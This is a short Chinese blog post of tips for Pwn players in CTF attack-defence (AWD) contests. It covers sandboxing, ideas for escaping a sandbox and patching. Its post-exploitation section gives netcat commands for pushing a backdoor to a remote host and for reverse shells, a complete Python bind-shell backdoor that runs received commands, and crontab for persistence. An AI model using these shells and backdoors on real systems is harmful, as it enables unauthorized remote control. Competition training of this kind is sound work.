---
title: CTF线下赛AWD中Pwn选手该如何生存
tags:
  - PWN
  - AWD
categories: []
date: 2017-05-16 07:43:00
---

## 关于赛前准备

### Sandbox

这两天准备XNUCA的时候一直在考虑沙盒的事情，因为awd中沙盒可以有效的保证在开局不会被打成筛子，在写沙盒的时候我又有了很多种可以选择的技术方案

+ ptrace
+ seccomp bpf
+ chroot
+ LD_PRELOAD

### excape Sandbox

+ ptrace

1. fork/vfork/clone
2. kill parent process
3. change arch(32 -> 64/64 -> 32ABI)

+ seccomp(not easy to use in awd)

### Patch艺术

1. inline patch

## 后渗透

1. nc 接收文件与传文件，我们可以将后门通过这种方式传过去
`nc -l -p port > filename`
`nc -q 1 dest_ip port < filename`（-q 传输完成1秒后断开连接）

2. nc反向连接
远程`nc -c /bin/sh local_ip locat_port`
`/bin/sh | nc local_ip local_port`
本地监听`nc -l -p local_port -vvv`

3. python的一个后门

```python
#!/usr/bin/env python
# coding=utf-8

import socket
import os
import sys
import subprocess

def makeio():
    c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    c.bind(('0.0.0.0', 10005))
    c.listen(1)
    s, a = c.accept()
    return s, a

def interactive(s):
    while True:
        data = s.recv(1024)
        if data == 'exit\n':
            return 0
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        stdoutput = proc.stdout.read() + proc.stderr.read()
        s.send(stdoutput)

def closeio(s):
    s.close()

if __name__ == '__main__':
    s, a = makeio()
    interactive(s)
    closeio(s)
    sys.exit()
```
说是后门，其实也就是绑定端口后连接，参考了[这个](https://github.com/jeffreysasaki/backdoor)

4. wget下载文件

```bash
wget -O ./filename URL
```

5. crontab

`crontab [-e | -l]`